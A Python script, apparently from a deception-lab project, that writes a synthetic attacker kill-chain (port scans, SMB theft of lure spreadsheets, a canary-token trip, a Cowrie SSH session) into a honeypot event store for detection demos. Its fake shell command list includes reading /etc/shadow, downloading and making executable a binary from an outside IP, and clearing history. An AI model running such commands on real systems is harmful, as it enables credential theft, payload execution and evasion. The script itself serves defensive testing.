#!/usr/bin/env python3
"""Attacker simulation — the demo centerpiece for the AI Deception Grid.

Emits a realistic kill-chain of ATTACKER events into the same event store
personas use (`core.events.get_sink()`), so the hub's detection/dashboard
layer treats them identically to real trap traffic. Runs fully offline
(SQLite via DirectSink) unless HUB_URL is set, in which case events are
POSTed to the hub like a containerized trap would.

Kill chain modeled:
  1. Recon        -> opencanary multi-service tripwire (scan/connect)
  2. SMB discovery -> samba list_dir + open_file/download of canaried docs
  3. Canary trip   -> canarytoken token_trigger from the exfiltrated doc
  4. SSH honeypot  -> cowrie login + interactive command session

This is authorized defensive-lab tooling: every event is synthetic and
lands in an isolated research event store, not a real system.
"""

from __future__ import annotations

import json
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Optional

# Allow running directly as `.venv/bin/python scripts/attacker_sim.py` from
# any cwd, by ensuring the repo root (parent of this file's directory) is on
# sys.path before importing core.*.
_ROOT = Path(__file__).resolve().parent.parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

from core.events import get_sink
from core.schema import Event, utcnow_iso

DEFAULT_ATTACKER_IP = "45.9.148.66"
CANARY_MANIFEST = _ROOT / "seed" / "generated" / "canary_manifest.json"

JUICY_FILES = [
    "it/passwords.xlsx",
    "finance/vendor_payments.xlsx",
    "hr/salaries_2026.xlsx",
]

COWRIE_COMMANDS = [
    "uname -a",
    "whoami",
    "cat /etc/passwd",
    "ls -la",
    "id",
    "cat /etc/shadow",
    "wget http://185.220.101.7/x86 -O /tmp/x86",
    "chmod +x /tmp/x86",
    "history -c",
]


def _load_canary_token(company_name: str = "Meridian Logistics") -> tuple[str, str]:
    """Return (token_id, canary_path) for the trip event.

    Reads seed/generated/canary_manifest.json if present (produced by the
    Decoy Generator); otherwise synthesizes a plausible token so the sim
    remains fully self-contained.
    """
    manifest_path = CANARY_MANIFEST
    if manifest_path.exists():
        try:
            data = json.loads(manifest_path.read_text())
            tokens = data.get("tokens") or data.get("canaries") or []

            if isinstance(tokens, dict):
                # Canonical shape written by the Decoy Generator:
                # {"CANARY-TOKEN:<uuid>": "relative/path/to/doc.xlsx", ...}
                # Prefer a token whose path matches one of our juicy lures.
                for token_id, path in tokens.items():
                    if path in JUICY_FILES:
                        return str(token_id), str(path)
                if tokens:
                    token_id, path = next(iter(tokens.items()))
                    return str(token_id), str(path)

            elif isinstance(tokens, list) and tokens:
                # Alternate list-of-records shape, kept for forward
                # compatibility: [{"token_id"/"id"/"token": ..., "path"/
                # "document": ...}, ...]
                first = tokens[0]
                if isinstance(first, dict):
                    token_id = first.get("token_id") or first.get("id") or first.get("token")
                    path = first.get("path") or first.get("document") or JUICY_FILES[0]
                    if token_id:
                        return str(token_id), str(path)
        except (json.JSONDecodeError, OSError):
            pass
    # Fallback: synthesize a realistic-looking token bound to a juicy file.
    synth_id = f"ct_{random.randint(10**11, 10**12 - 1):x}"
    return synth_id, JUICY_FILES[0]


def _recon_events(attacker_ip: str) -> list[Event]:
    """Phase 1: opencanary multi-service tripwire gets scanned/connected."""
    plan = [
        ("ftp", "scan"),
        ("ftp", "connect"),
        ("http", "scan"),
        ("http", "connect"),
        ("mysql", "scan"),
        ("mysql", "connect"),
        ("smb", "scan"),
        ("smb", "connect"),
    ]
    events = []
    for service, action in plan:
        events.append(Event(
            source="opencanary",
            service=service,
            action=action,
            src_ip=attacker_ip,
            dst_host="canary-multi",
            detail={
                "phase": "recon",
                "service": service,
                "note": f"unsolicited {action} on {service} tripwire",
            },
            raw=f"opencanary: {action} {service} from {attacker_ip}",
            ts=utcnow_iso(),
        ))
    return events


def _samba_events(attacker_ip: str) -> list[Event]:
    """Phase 2: SMB discovery + exfiltration of canaried lure documents."""
    events = [Event(
        source="samba",
        service="smb",
        action="list_dir",
        src_ip=attacker_ip,
        dst_host="fileserver",
        detail={"phase": "discovery", "dir": "/", "shares": ["finance", "it", "hr"]},
        raw=f"smb: list_dir / from {attacker_ip}",
        ts=utcnow_iso(),
    )]
    for path in JUICY_FILES:
        events.append(Event(
            source="samba",
            service="smb",
            action="open_file",
            src_ip=attacker_ip,
            dst_host="fileserver",
            detail={"phase": "exfil", "path": path},
            raw=f"smb: open_file {path} from {attacker_ip}",
            ts=utcnow_iso(),
        ))
        events.append(Event(
            source="samba",
            service="smb",
            action="download",
            src_ip=attacker_ip,
            dst_host="fileserver",
            detail={"phase": "exfil", "path": path, "bytes": random.randint(20_000, 250_000)},
            raw=f"smb: download {path} from {attacker_ip}",
            ts=utcnow_iso(),
        ))
    return events


def _canary_event(attacker_ip: str, company_name: str) -> Event:
    """Phase 3: canary token fires from the exfiltrated document."""
    token_id, canary_path = _load_canary_token(company_name)
    return Event(
        source="canarytoken",
        service="http",
        action="token_trigger",
        src_ip=attacker_ip,
        dst_host="canary-service",
        detail={
            "phase": "canary_trip",
            "token_id": token_id,
            "document": canary_path,
            "note": "embedded canary fired when the exfiltrated document was opened",
        },
        raw=f"canarytoken: trigger {token_id} (doc={canary_path}) from {attacker_ip}",
        ts=utcnow_iso(),
    )


def _cowrie_events(attacker_ip: str) -> list[Event]:
    """Phase 4: attacker pokes the fake shell via the SSH/Telnet honeypot."""
    events = [Event(
        source="cowrie",
        service="ssh",
        action="login",
        src_ip=attacker_ip,
        dst_host="cowrie-ssh",
        identity="root",
        detail={"phase": "ssh", "username": "root", "password": "admin123", "success": True},
        raw=f"cowrie: login root/admin123 from {attacker_ip} SUCCESS",
        ts=utcnow_iso(),
    )]
    for cmd in COWRIE_COMMANDS:
        events.append(Event(
            source="cowrie",
            service="ssh",
            action="command",
            src_ip=attacker_ip,
            dst_host="cowrie-ssh",
            identity="root",
            detail={"phase": "ssh", "input": cmd},
            raw=f"cowrie: CMD: {cmd}",
            ts=utcnow_iso(),
        ))
    return events


def _per_event_gap(event: Event) -> float:
    """Seconds an attacker realistically spends before the *next* action.

    Honeypot tarpitting is the point of the exercise, so Cowrie shell commands
    carry the largest gaps (the fake shell is deliberately slow), SMB exfil is
    moderate, and recon scans are quick. Jitter keeps it from looking scripted.
    """
    base = {
        "opencanary": 6.0,   # fast automated scanning
        "samba": 18.0,       # browsing shares, pulling files
        "canarytoken": 2.0,  # instantaneous callback
        "cowrie": 55.0,      # tarpitted fake shell — the slowdown
    }.get(event.source, 10.0)
    return base * random.uniform(0.6, 1.6)


def _spread_timestamps(events: list[Event]) -> None:
    """Rewrite event timestamps to span a believable attacker dwell ending now.

    Produces a monotonically increasing sequence so the dashboard's
    "attacker time wasted" metric (first→last alert span) reflects the real
    time the decoys held the intruder, rather than a single instant.
    """
    gaps = [_per_event_gap(e) for e in events[:-1]] + [0.0]
    total = sum(gaps)
    t = datetime.now(timezone.utc) - timedelta(seconds=total)
    for event, gap in zip(events, gaps):
        event.ts = t.isoformat()
        t += timedelta(seconds=gap)


def run_attack(sink: Optional[Any] = None, attacker_ip: str = DEFAULT_ATTACKER_IP,
               company: Optional[Any] = None) -> int:
    """Emit a full attacker kill-chain into `sink` (or a fresh get_sink()).

    Returns the number of events emitted. Does not close a sink that was
    passed in by the caller (only closes sinks it created itself), so tests
    can keep querying their own sink/connection afterward.
    """
    owns_sink = sink is None
    if sink is None:
        sink = get_sink()

    company_name = getattr(company, "name", None) or "Meridian Logistics"

    events: list[Event] = []
    events.extend(_recon_events(attacker_ip))
    events.extend(_samba_events(attacker_ip))
    events.append(_canary_event(attacker_ip, company_name))
    events.extend(_cowrie_events(attacker_ip))

    # Give the kill-chain a realistic timeline so dwell/time-wasted is meaningful.
    _spread_timestamps(events)

    for event in events:
        sink.emit(event)

    if owns_sink:
        sink.close()

    return len(events)


def main() -> None:
    count = run_attack()
    print(f"[attacker_sim] emitted {count} attacker events "
          f"(recon -> smb exfil -> canary trip -> ssh session) "
          f"from {DEFAULT_ATTACKER_IP}")


if __name__ == "__main__":
    main()
